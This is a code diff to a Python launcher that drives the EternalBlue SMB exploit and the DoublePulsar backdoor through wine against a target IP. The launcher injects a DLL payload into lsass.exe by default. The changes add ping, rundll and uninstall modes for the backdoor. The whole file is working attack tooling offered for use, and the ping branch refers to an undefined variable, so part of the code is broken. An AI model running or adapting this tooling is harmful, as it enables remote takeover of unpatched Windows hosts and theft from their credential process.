@@ -1,5 +1,6 @@
 import os
 import commands
+import sys
 
 from blessings import Terminal
 term = Terminal()
@@ -19,16 +20,17 @@ quote = "'"
 space = " "
 direct = " > "
 
-dll = rhost = rport = timeout = arch = target = process = ""
+dll = rhost = rport = timeout = arch = target = process = function = ""
 
 def getArguments():
-	global dll,rhost,rport,timeout,arch,target,process
+	global dll,rhost,rport,timeout,arch,target,process,function
 	argument_parser.add_argument("-A","--arch",type=str,help="Target host architecture  x64|x86",required=True)
 	argument_parser.add_argument("-V","--version",type=str,help="Target host os version  XP|WIN72K8R2", required=True)
 	argument_parser.add_argument("-H","--host",type=str,help="Target host ip address",required=True)
 	argument_parser.add_argument("-P","--port",type=str,help="Target host port",default="445")
-	argument_parser.add_argument("-T","--timeout",type=str,help="Timeout",default="20")
+	argument_parser.add_argument("-T","--timeout",type=str,help="Timeout",default="60")
 	argument_parser.add_argument("-D","--dll",type=str,help="Dll payload path",required=True)
+	argument_parser.add_argument("-F","--function",type=str,help="DoublePulsar backdoor function ping|rundll|uninstall",required=True)
 	argument_parser.add_argument("--process",type=str,help="Name of process to inject into",default="lsass.exe")
 	
 	args = argument_parser.parse_args()
@@ -38,6 +40,7 @@ def getArguments():
 	rport = args.port
 	timeout = args.timeout
 	dll = args.dll
+	function = args.function.lower()
 	process = args.process
 
 def banner():
@@ -48,11 +51,12 @@ def banner():
 def print_info():
 	print term.bold_yellow("[RHOST]: ")+rhost
 	print term.bold_yellow("[RPORT]: ")+rport
-	print term.bold_yellow("[TIMEOUT]: ")+timeout
 	print term.bold_yellow("[ARCH]: ")+arch
 	print term.bold_yellow("[TARGET]: ")+target
 	print term.bold_yellow("[PROCESS]: ")+process
-	print term.bold_yellow("[DLL]: ")+dll
+	print term.bold_yellow("[FUNCTION]: ")+function
+	print term.bold_yellow("[DLL]: ")+dll	
+	print term.bold_yellow("[TIMEOUT]: ")+timeout
 	print "----------------------------------------------------"
 
 
@@ -81,8 +85,28 @@ def generate_doublepulsar_config():
 	os.system(command)
 	command = "sed " + quote + "s/%TARGETARCHITECTURE%/" + arch + "/" + quote + space + "-i " + doublepulsar_config 
 	os.system(command)
+
+	status = 0
+	if function == "ping":
+		command = "sed " + quote + "s/%FUNCTION%/" + "Ping" + "/" + quote + space + "-i " + doublepulsar_config 
+		os.system(command)
+		status = 1
+	elif function == "rundll":
+		command = "sed " + quote + "s/%FUNCTION%/" + "RunDLL" + "/" + quote + space + "-i " + doublepulsar_config 
+		os.system(command)
+		status = 2
+	elif function == "uninstall":
+		command = "sed " + quote + "s/%FUNCTION%/" + "Uninstall" + "/" + quote + space + "-i " + doublepulsar_config 
+		os.system(command)
+		status = 3
+	else:
+		print term.bold_red("[!] Wrong function string")
+		sys.exit()
+	
 	command = "sed " + quote + "s/%DLLPAY%/" + dll + "/" + quote + space + "-i " + doublepulsar_config 
 	os.system(command)
+
+	return status
 
 
 def run_eternalblue():
@@ -102,18 +126,42 @@ def run_eternalblue():
 		print term.bold_red("[-] " +"Exploitation failed")
 		return False
 
-def run_doublepulsar():
-	command = "wine "  + doublepulsar_exe
-	ret = commands.getstatusoutput(command)
-	output = ret[1]
+def run_doublepulsar(status):
 	success = "Backdoor returned code: 10 - Success!"
-	if success in output:
-		print term.bold_green("[+] " + "Backdoor installed successfuly")
-		return True
-	else:
-		print term.bold_red("[-] " + "Backdoor installation failed")
-		return False
+	fail = "backdoor not present"
+	killed = "Backdoor killed"
+	
+	if status == 1:
+		print term.bold_yellow("[!] Pinging DoublePulsar")
+		command = "wine "  + doublepulsar_exe
+		ret = commands.getstatusoutput(command)
+		output = ret[1]
+		if fail in output:
+			print term.bold_red("[-] " + "Backdoor not present")
+		elif backdoor in output:
+			print term.bold_green("[+] " + "Backdoor installed successfuly")
 
+
+	elif status == 3:
+		print term.bold_yellow("[!] Uninstalling DoublePulsar")
+		command = "wine "  + doublepulsar_exe
+		ret = commands.getstatusoutput(command)
+		output = ret[1]
+		if fail in output:
+			print term.bold_red("[-] " + "Backdoor not present")
+		elif killed in output:
+			print term.bold_green("[-] " + "Backdoor uninstalled successfully")
+
+	elif status == 2:
+		command = "wine "  + doublepulsar_exe
+		ret = commands.getstatusoutput(command)
+		output = ret[1]
+		if success in output:
+			print term.bold_green("[+] " + "Dll injected successfuly")
+			return True
+		else:
+			print term.bold_red("[-] " + "Backdoor installation failed")
+			return False
 
 
 def main():
@@ -121,14 +169,18 @@ def main():
 	getArguments()
 	print_info()
 	generate_eternalblue_config()
-	generate_doublepulsar_config()
-	print term.bold_yellow("[!] Starting EternalBlue")
-	eternalblue = run_eternalblue()
-	if eternalblue:
-		print term.bold_yellow("[!] Running DoublePulsar")
-		doublepulsar = run_doublepulsar()
-		if doublepulsar:
-			print term.bold_green("[+] You can connect with " + dll)
+	status = generate_doublepulsar_config()
 
+	if status == 2:
+		print term.bold_yellow("[!] Starting EternalBlue")
+		eternalblue = run_eternalblue()
+		if eternalblue:
+			print term.bold_yellow("[!] Running DoublePulsar")
+			doublepulsar = run_doublepulsar(status)
+			if doublepulsar:
+				print term.bold_green("[+] You can connect with " + dll)
+	else:
+		print term.bold_yellow("[!] Running DoublePulsar")
+		doublepulsar = run_doublepulsar(status)
 
 main()
